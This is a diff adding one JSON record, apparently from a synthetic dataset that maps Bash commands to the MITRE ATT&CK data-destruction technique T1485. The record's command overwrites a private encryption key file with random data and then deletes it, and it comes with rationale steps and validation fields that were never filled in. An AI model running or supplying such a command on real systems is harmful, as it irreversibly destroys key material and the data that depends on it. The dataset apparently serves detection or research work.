@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1485",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "bash -c 'f=/etc/ssl/private/finance.key; sz=$(stat -c%s \"$f\"); chmod u+w \"$f\" 2>/dev/null || true; dd if=/dev/urandom of=\"$f\" bs=$sz count=1 conv=notrunc,fdatasync status=none && rm -f \"$f\"'",
+  "explanation": "Overwrites and removes a targeted encryption key file to render dependent data inaccessible.",
+  "rationale_steps": [
+    "Ensure the file is writable",
+    "Get the exact file size",
+    "Overwrite with random data to destroy key material",
+    "Flush buffers and delete the file"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1485-9214ae56-42f65dbb",
+  "source_prompt_hash": "9214ae56",
+  "timestamp_utc": "2025-09-30T07:55:14.956261Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
